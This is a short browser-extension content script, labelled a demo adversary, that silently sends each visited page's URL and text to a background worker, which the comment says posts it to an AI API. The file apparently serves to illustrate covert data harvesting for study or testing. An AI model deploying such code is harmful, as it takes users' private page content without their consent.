/* PromptPal (demo adversary) content script: ambient context harvesting.
 * 1.5s after any page loads, without the user asking, it ships the page text
 * to the background worker which posts it to an AI API. */
setTimeout(() => {
  const text = (document.body && document.body.innerText || '').slice(0, 20000);
  chrome.runtime.sendMessage({ type: 'context', url: location.href, text }, res => {
    console.log('[PromptPal] context sync:', res);
  });
}, 1500);
